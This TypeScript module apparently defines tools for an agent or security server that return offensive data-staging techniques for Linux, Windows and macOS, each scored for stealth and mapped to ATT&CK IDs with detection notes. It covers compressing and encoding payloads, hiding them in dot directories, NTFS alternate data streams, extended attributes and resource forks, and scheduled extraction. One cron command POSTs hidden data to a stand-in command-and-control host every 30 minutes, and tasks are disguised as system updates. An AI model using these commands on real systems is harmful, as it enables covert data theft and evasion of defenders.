import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { Platform } from "../schema/unified-entry.js";

function deduplicateByBinary(entries: any[]): any[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    if (seen.has(e.id)) return false;
    seen.add(e.id);
    return true;
  });
}

function summarizeKbEntry(e: any): Record<string, unknown> {
  return {
    id: e.id, binary: e.binary, platform: e.platform, catalog: e.catalogSource,
    functions: e.functions, stealth_score: e.stealthScore, description: e.description,
    attck_techniques: e.attckTechniques,
  };
}

interface StagingTechnique {
  technique: string;
  description: string;
  platform: string;
  binary: string;
  stage_command: string;
  extract_command: string;
  stealth_score: number;
  attck_ids: string[];
  detection_notes: string;
}

// ── stage_compress ──────────────────────────────────────────────────────────

const stage_compress: ToolDef = {
  name: "stage_compress",
  description: "Compression techniques for payload staging — gzip, tar, compact.exe, and platform-native tools",
  schema: {
    platform: z.enum(["linux", "windows", "macos"]).default("linux").describe("Target platform"),
    data_path: z.string().optional().describe("Optional path to data for staging"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const { platform, data_path } = args;
    const target = data_path || "/tmp/staged_data";

    const allTechniques: StagingTechnique[] = [
      {
        technique: "gzip compression",
        description: "Use gzip to compress staged payloads, reducing size and avoiding content-based signatures",
        platform: "linux", binary: "gzip",
        stage_command: `gzip -c ${target} > ${target}.gz`,
        extract_command: `gzip -d ${target}.gz`,
        stealth_score: 2, attck_ids: ["T1074", "T1027"],
        detection_notes: "Monitor gzip process creation on sensitive paths. Low suspicion in most environments.",
      },
      {
        technique: "tar archive staging",
        description: "Use tar to bundle multiple staged files into a single archive",
        platform: "linux", binary: "tar",
        stage_command: `tar czf ${target}.tar.gz -C /tmp staged_dir/`,
        extract_command: `tar xzf ${target}.tar.gz -C /tmp/output/`,
        stealth_score: 1, attck_ids: ["T1074", "T1560.001"],
        detection_notes: "tar is very common — detection relies on context (path, user, timing).",
      },
      {
        technique: "compact.exe NTFS compression",
        description: "Use compact.exe to enable NTFS compression on staged files — reduces size without external tools",
        platform: "windows", binary: "compact.exe",
        stage_command: `compact /c /s:C:\\Temp\\staged_data`,
        extract_command: `compact /u /s:C:\\Temp\\staged_data`,
        stealth_score: 3, attck_ids: ["T1074", "T1027"],
        detection_notes: "Monitor compact.exe usage. Uncommon in standard workflows.",
      },
      {
        technique: "zip compression (macOS/Linux)",
        description: "Use zip to compress and bundle staged payloads",
        platform: "macos", binary: "zip",
        stage_command: `zip -r ${target}.zip ${target}`,
        extract_command: `unzip ${target}.zip -d /tmp/output/`,
        stealth_score: 1, attck_ids: ["T1074", "T1560.001"],
        detection_notes: "zip is ubiquitous on macOS — monitor for unusual target paths.",
      },
      {
        technique: "makecab cabinet archive",
        description: "Use makecab to create cabinet archives for staging on Windows",
        platform: "windows", binary: "makecab.exe",
        stage_command: `makecab C:\\Temp\\payload.exe C:\\Temp\\payload.cab`,
        extract_command: `expand C:\\Temp\\payload.cab C:\\Temp\\payload.exe`,
        stealth_score: 3, attck_ids: ["T1074", "T1027"],
        detection_notes: "Monitor makecab.exe and expand.exe for non-standard usage patterns.",
      },
    ];

    const filtered = allTechniques.filter(t => t.platform === platform);
    const kbEntries = deduplicateByBinary(ctx.knowledgeBase.searchByKeyword("compress", platform));

    return json({
      category: "compression_staging", platform, total_techniques: filtered.length,
      techniques: filtered, kb_entries: kbEntries.slice(0, 5).map(summarizeKbEntry),
    });
  },
};

// ── stage_encode ────────────────────────────────────────────────────────────

const stage_encode: ToolDef = {
  name: "stage_encode",
  description: "Encoding techniques for payload staging — base64, xxd, certutil and platform-native encoders",
  schema: {
    platform: z.enum(["linux", "windows", "macos"]).default("linux").describe("Target platform"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const { platform } = args;

    const allTechniques: StagingTechnique[] = [
      {
        technique: "base64 encode payload",
        description: "Use base64 to encode payload for staging — avoids binary content detection",
        platform: "linux", binary: "base64",
        stage_command: "base64 < payload.bin > payload.b64",
        extract_command: "base64 -d < payload.b64 > payload.bin",
        stealth_score: 2, attck_ids: ["T1074", "T1027"],
        detection_notes: "Monitor base64 process creation. Extremely common utility.",
      },
      {
        technique: "xxd hex encode",
        description: "Use xxd to hex-encode payloads for staging in text-friendly formats",
        platform: "linux", binary: "xxd",
        stage_command: "xxd -p payload.bin > payload.hex",
        extract_command: "xxd -r -p payload.hex > payload.bin",
        stealth_score: 2, attck_ids: ["T1074", "T1027"],
        detection_notes: "xxd is less commonly monitored than base64. Check for hex-encoded executables.",
      },
      {
        technique: "certutil encode",
        description: "Use certutil to Base64-encode payloads on Windows for staging",
        platform: "windows", binary: "certutil.exe",
        stage_command: "certutil -encode payload.exe payload.b64",
        extract_command: "certutil -decode payload.b64 payload.exe",
        stealth_score: 4, attck_ids: ["T1074", "T1140"],
        detection_notes: "Well-known LOL technique. Multiple Sigma rules exist for certutil -encode/-decode.",
      },
      {
        technique: "macOS base64 encode",
        description: "Use macOS native base64 command with -i/-o flags for payload encoding",
        platform: "macos", binary: "base64",
        stage_command: "base64 -i payload.bin -o payload.b64",
        extract_command: "base64 -D -i payload.b64 -o payload.bin",
        stealth_score: 2, attck_ids: ["T1074", "T1027"],
        detection_notes: "Monitor base64 with -D decode flag. macOS uses -D instead of -d.",
      },
      {
        technique: "BitsTransfer encode",
        description: "Use PowerShell BitsTransfer to stage and encode payloads on Windows",
        platform: "windows", binary: "powershell.exe",
        stage_command: "[Convert]::ToBase64String([IO.File]::ReadAllBytes('payload.exe')) | Out-File payload.b64",
        extract_command: "[IO.File]::WriteAllBytes('payload.exe', [Convert]::FromBase64String((Get-Content payload.b64)))",
        stealth_score: 3, attck_ids: ["T1074", "T1027", "T1059.001"],
        detection_notes: "PowerShell script block logging will capture these commands.",
      },
    ];

    const filtered = allTechniques.filter(t => t.platform === platform);
    const kbEntries = deduplicateByBinary(ctx.knowledgeBase.searchByKeyword("encode", platform));

    return json({
      category: "encoding_staging", platform, total_techniques: filtered.length,
      techniques: filtered, kb_entries: kbEntries.slice(0, 5).map(summarizeKbEntry),
    });
  },
};

// ── stage_hide ──────────────────────────────────────────────────────────────

const stage_hide: ToolDef = {
  name: "stage_hide",
  description: "Hide staged payloads in filesystem — ADS on Windows, dot files on Linux, extended attributes on macOS",
  schema: {
    platform: z.enum(["linux", "windows", "macos"]).default("linux").describe("Target platform"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const { platform } = args;

    const allTechniques: StagingTechnique[] = [
      {
        technique: "Dot file hiding",
        description: "Prefix files with a dot to hide from default ls listing on Linux",
        platform: "linux", binary: "mv",
        stage_command: "mv payload.bin /tmp/.payload.bin",
        extract_command: "cp /tmp/.payload.bin /tmp/payload.bin",
        stealth_score: 2, attck_ids: ["T1074", "T1564.001"],
        detection_notes: "Use ls -la or find to detect hidden files. Monitor file creation in /tmp with dot prefix.",
      },
      {
        technique: "Nested directory hiding",
        description: "Create deeply nested hidden directories to stage payloads",
        platform: "linux", binary: "mkdir",
        stage_command: "mkdir -p /tmp/.cache/.tmp/.data && cp payload.bin /tmp/.cache/.tmp/.data/",
        extract_command: "cp /tmp/.cache/.tmp/.data/payload.bin .",
        stealth_score: 3, attck_ids: ["T1074", "T1564.001"],
        detection_notes: "Monitor recursive directory creation in temporary paths.",
      },
      {
        technique: "NTFS Alternate Data Streams",
        description: "Hide payloads in NTFS ADS — invisible to standard dir listing",
        platform: "windows", binary: "cmd.exe",
        stage_command: "type payload.exe > C:\\Temp\\readme.txt:payload.exe",
        extract_command: "more < C:\\Temp\\readme.txt:payload.exe > payload.exe",
        stealth_score: 4, attck_ids: ["T1074", "T1564.004"],
        detection_notes: "Monitor for ADS creation with Sysmon Event ID 15. Use dir /r to reveal ADS.",
      },
      {
        technique: "Windows hidden attribute",
        description: "Set hidden and system attributes on staged files",
        platform: "windows", binary: "attrib.exe",
        stage_command: "attrib +h +s C:\\Temp\\payload.exe",
        extract_command: "attrib -h -s C:\\Temp\\payload.exe",
        stealth_score: 3, attck_ids: ["T1074", "T1564.001"],
        detection_notes: "Monitor attrib.exe usage with +h or +s flags.",
      },
      {
        technique: "macOS extended attributes",
        description: "Use xattr to store payload data in extended attributes of legitimate files",
        platform: "macos", binary: "xattr",
        stage_command: "xattr -w com.apple.metadata:payload \"$(base64 < payload.bin)\" /tmp/legit_file.txt",
        extract_command: "xattr -p com.apple.metadata:payload /tmp/legit_file.txt | base64 -D > payload.bin",
        stealth_score: 4, attck_ids: ["T1074", "T1564.009"],
        detection_notes: "Monitor xattr writes to non-standard attribute names. Use xattr -l to list all.",
      },
      {
        technique: "macOS resource fork hiding",
        description: "Hide data in macOS resource forks using the /..namedfork/rsrc path",
        platform: "macos", binary: "cp",
        stage_command: "cp payload.bin /tmp/legit_file.txt/..namedfork/rsrc",
        extract_command: "cp /tmp/legit_file.txt/..namedfork/rsrc payload.bin",
        stealth_score: 4, attck_ids: ["T1074", "T1564.009"],
        detection_notes: "Resource forks are rarely used in modern macOS — any usage is suspicious.",
      },
    ];

    const filtered = allTechniques.filter(t => t.platform === platform);
    const kbEntries = deduplicateByBinary(ctx.knowledgeBase.searchByKeyword("hide", platform));

    return json({
      category: "filesystem_hiding", platform, total_techniques: filtered.length,
      techniques: filtered, kb_entries: kbEntries.slice(0, 5).map(summarizeKbEntry),
    });
  },
};

// ── stage_schedule_extract ──────────────────────────────────────────────────

const stage_schedule_extract: ToolDef = {
  name: "stage_schedule_extract",
  description: "Scheduled extraction of staged data — cron, scheduled tasks, launchd for timed data retrieval",
  schema: {
    platform: z.enum(["linux", "windows", "macos"]).default("linux").describe("Target platform"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const { platform } = args;

    const allTechniques: StagingTechnique[] = [
      {
        technique: "Cron-based extraction",
        description: "Use cron jobs to periodically extract staged data to an exfiltration point",
        platform: "linux", binary: "crontab",
        stage_command: "(crontab -l 2>/dev/null; echo '*/30 * * * * curl -s -X POST -d @/tmp/.data http://c2.example.com/collect') | crontab -",
        extract_command: "crontab -l | grep -v 'c2.example.com' | crontab -",
        stealth_score: 3, attck_ids: ["T1074", "T1053.003"],
        detection_notes: "Monitor crontab modifications. Check for curl/wget in cron entries.",
      },
      {
        technique: "Systemd timer extraction",
        description: "Use systemd timers for scheduled extraction — more persistent than cron",
        platform: "linux", binary: "systemctl",
        stage_command: "systemctl --user enable extract.timer && systemctl --user start extract.timer",
        extract_command: "systemctl --user stop extract.timer && systemctl --user disable extract.timer",
        stealth_score: 3, attck_ids: ["T1074", "T1053.003"],
        detection_notes: "Monitor user-level systemd timer creation. Check /etc/systemd/user/ for new units.",
      },
      {
        technique: "Scheduled Task extraction",
        description: "Use schtasks to create periodic extraction tasks on Windows",
        platform: "windows", binary: "schtasks.exe",
        stage_command: 'schtasks /create /tn "SystemUpdate" /tr "powershell -ep bypass -f C:\\Temp\\extract.ps1" /sc hourly /mo 1',
        extract_command: 'schtasks /delete /tn "SystemUpdate" /f',
        stealth_score: 4, attck_ids: ["T1074", "T1053.005"],
        detection_notes: "Monitor schtasks.exe for task creation. Check Security EventLog 4698.",
      },
      {
        technique: "launchd extraction",
        description: "Use launchd agents for scheduled extraction on macOS",
        platform: "macos", binary: "launchctl",
        stage_command: "launchctl load ~/Library/LaunchAgents/com.apple.systemupdate.plist",
        extract_command: "launchctl unload ~/Library/LaunchAgents/com.apple.systemupdate.plist",
        stealth_score: 3, attck_ids: ["T1074", "T1053.004"],
        detection_notes: "Monitor LaunchAgent plist creation. Check for suspicious program arguments in plists.",
      },
    ];

    const filtered = allTechniques.filter(t => t.platform === platform);
    const kbEntries = deduplicateByBinary(ctx.knowledgeBase.searchByKeyword("schedule", platform));

    return json({
      category: "scheduled_extraction", platform, total_techniques: filtered.length,
      techniques: filtered, kb_entries: kbEntries.slice(0, 5).map(summarizeKbEntry),
    });
  },
};

// ── Export ─────────────────────────────────────────────────────────────────────

export const stagedPayloadTools: ToolDef[] = [
  stage_compress,
  stage_encode,
  stage_hide,
  stage_schedule_extract,
];
